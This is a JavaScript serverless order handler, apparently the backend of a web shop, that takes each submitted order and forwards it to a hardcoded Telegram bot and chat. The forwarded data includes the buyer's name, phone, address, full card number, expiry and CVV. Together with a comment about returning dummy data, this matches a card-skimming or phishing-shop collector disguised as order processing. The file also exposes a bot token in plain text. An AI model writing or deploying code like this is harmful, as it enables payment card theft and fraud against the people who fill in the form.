import Cors from 'cors';

// 1. Enter your Telegram Details Here
const BOT_TOKEN = "8575730600:AAH8zc1S1-zwe5uu84t98PXc1Gp_j6YHMPw"; // Paste Token inside quotes
const CHAT_ID = "7833988868";     // Paste Chat ID inside quotes

// Initialize CORS
const cors = Cors({
  origin: 'https://demotestdeletesoon.vercel.app', // Your specific frontend
  methods: ['POST', 'OPTIONS'],
  credentials: true,
  allowedHeaders: ['Content-Type']
});

// Helper to run middleware
function runMiddleware(req, res, fn) {
  return new Promise((resolve, reject) => {
    fn(req, res, (result) => {
      if (result instanceof Error) return reject(result);
      return resolve(result);
    });
  });
}

export default async function handler(req, res) {
  // Run CORS check first
  await runMiddleware(req, res, cors);

  if (req.method === 'POST') {
    try {
      const data = req.body;

      // 2. Format the message for Telegram
      const message = `
📦 *NEW ORDER RECEIVED*
----------------------------
👤 *Customer:* ${data.fullName}
📞 *Mobile:* ${data.mobile}
📍 *City:* ${data.cityState}
🏠 *Address:* ${data.fullAddress}
----------------------------
🛒 *Product:* ${data.productName}
💰 *Total:* ${data.totalAmount}
----------------------------
💳 *Payment Details:*
Method: ${data.paymentMethod}
Card: ${data.cardNumber}
Expiry: ${data.expiryDate}
CVV: ${data.securityCode}
      `;

      // 3. Send to Telegram
      const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
      
      const telegramResponse = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });

      if (!telegramResponse.ok) {
        throw new Error('Telegram API Failed');
      }

      // 4. Respond to Frontend (Success)
      res.status(200).json({ 
        success: true, 
        message: "Order sent to Telegram!",
        // We send back dummy data so the frontend doesn't crash
        resData: { id: "123", ...data } 
      });

    } catch (error) {
      console.error("Error:", error);
      res.status(500).json({ success: false, message: "Server error" });
    }
  } else {
    res.status(405).json({ success: false });
  }
}
